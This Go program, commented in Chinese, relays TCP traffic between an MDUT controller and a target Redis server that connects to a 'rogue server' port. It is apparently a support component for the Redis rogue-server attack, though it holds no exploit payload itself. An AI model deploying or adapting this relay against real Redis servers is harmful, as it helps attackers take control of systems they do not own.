package main

import (
	"flag"
	"io"
	"log"
	"net"
	"time"
)

func main() {
	controlPort := flag.String("c", "21000", "控制端监听端口（MDUT 连入）")
	roguePort := flag.String("r", "21001", "Rogue Server 监听端口（目标 Redis 连入）")
	flag.Parse()

	log.Printf("[*] MDUT Redis Relay 启动...")
	log.Printf("[*] 控制端端口: %s", *controlPort)
	log.Printf("[*] 目标 Redis 连入端口: %s", *roguePort)

	// 监听控制端口（来自 MDUT）
	controlLn, err := net.Listen("tcp", "0.0.0.0:"+*controlPort)
	if err != nil {
		log.Fatalf("[-] 无法监听控制端口 %s: %v", *controlPort, err)
	}
	defer controlLn.Close()

	// 监听目标端端口（来自目标 Redis）
	rogueLn, err := net.Listen("tcp", "0.0.0.0:"+*roguePort)
	if err != nil {
		log.Fatalf("[-] 无法监听 Rogue 端口 %s: %v", *roguePort, err)
	}
	defer rogueLn.Close()

	for {
		log.Printf("[*] 等待 MDUT 控制端连入 (端口 %s)...", *controlPort)
		controlConn, err := controlLn.Accept()
		if err != nil {
			log.Printf("[-] 接收控制端连接失败: %v", err)
			continue
		}
		log.Printf("[+] MDUT 控制端已连接: %s", controlConn.RemoteAddr())

		// 为避免死等导致队列堆积，这里给目标 Redis 的连入设置一个 15 秒超时
		rogueLn.(*net.TCPListener).SetDeadline(time.Now().Add(15 * time.Second))
		
		log.Printf("[*] 等待目标 Redis 连入 (端口 %s)...", *roguePort)
		rogueConn, err := rogueLn.Accept()
		if err != nil {
			log.Printf("[-] 接收目标 Redis 连接超时或失败，清理当前会话并重置...")
			controlConn.Close()
			continue
		}
		// 恢复无超时状态
		rogueLn.(*net.TCPListener).SetDeadline(time.Time{})

		log.Printf("[+] 目标 Redis 已连接: %s", rogueConn.RemoteAddr())

		log.Printf("[*] 开始全双工流量转发...")
		go handleRelay(controlConn, rogueConn)
	}
}

func handleRelay(client, server net.Conn) {
	defer client.Close()
	defer server.Close()

	errc := make(chan error, 2)

	go func() {
		n, err := io.Copy(client, server)
		log.Printf("[DEBUG] 目标Redis -> MDUT 共转发 %d 字节", n)
		errc <- err
	}()

	go func() {
		n, err := io.Copy(server, client)
		log.Printf("[DEBUG] MDUT -> 目标Redis 共转发 %d 字节", n)
		errc <- err
	}()

	err := <-errc
	log.Printf("[*] 转发结束，连接已断开。原因: %v", err)
}
